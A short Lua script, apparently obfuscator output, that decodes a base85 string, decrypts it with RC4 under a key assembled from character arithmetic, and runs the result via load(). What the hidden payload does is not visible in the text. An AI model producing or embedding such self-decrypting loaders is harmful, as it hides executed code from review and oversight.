local pb_str = "ixNN7Xkex`(zNr5E)|B)+?u(iTMf#1$AbX"

local KCFgzETf = string.char(93-16,92-36,42+27,105-19,48+42,136-37,86+16,76+42,133-36,38+34,12+42,30+22,71+40,79+35,94-27,134-18,164-43,57+27,88+19,63+25,85-31,75+40,47+29,90-22,98-26,33+18,85-29,144-32,132-21,121-42,143-29,100-29)
local function hcmBQTqI(a,b)
    local p,c=1,0
    while a>0 and b>0 do
        local ra,rb=a%2,b%2
        if ra~=rb then c=c+p end
        a,b,p=(a-ra)/2,(b-rb)/2,p*2
    end
    if a<b then a=b end
    while a>0 do
        local ra=a%2 if ra>0 then c=c+p end a,p=(a-ra)/2,p*2
    end
    return c
end
local function YVSRYcJL(s)
    local m,o,p,v,n,c={},{},{52200625,614125,7225,85,1},0,0,"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!#$%&()*+-;<=>?@^_`{|}~"
    for i=1,85 do m[string.byte(c,i)]=i-1 end
    for i=1,#s do
        local x=m[string.byte(s,i)]
        if x then
            v=v+x*p[n+1] n=n+1
            if n==5 then
                table.insert(o,string.char(math.floor(v/16777216),math.floor((v%16777216)/65536),math.floor((v%65536)/256),v%256))
                v,n=0,0
            end
        end
    end
    return table.concat(o)
end
local function HwAfQOtO(d,k)
    local s={} for i=0,255 do s[i]=i end
    local j=0
    for i=0,255 do j=(j+s[i]+string.byte(k,(i%#k)+1))%256 s[i],s[j]=s[j],s[i] end
    local i,out=0,{} j=0
    for idx=1,#d do
        i=(i+1)%256 j=(j+s[i])%256 s[i],s[j]=s[j],s[i]
        out[#out+1]=string.char(hcmBQTqI(string.byte(d,idx),s[(s[i]+s[j])%256]))
    end
    return table.concat(out)
end
local p_data = HwAfQOtO(YVSRYcJL(pb_str), KCFgzETf)
assert(load(p_data))()
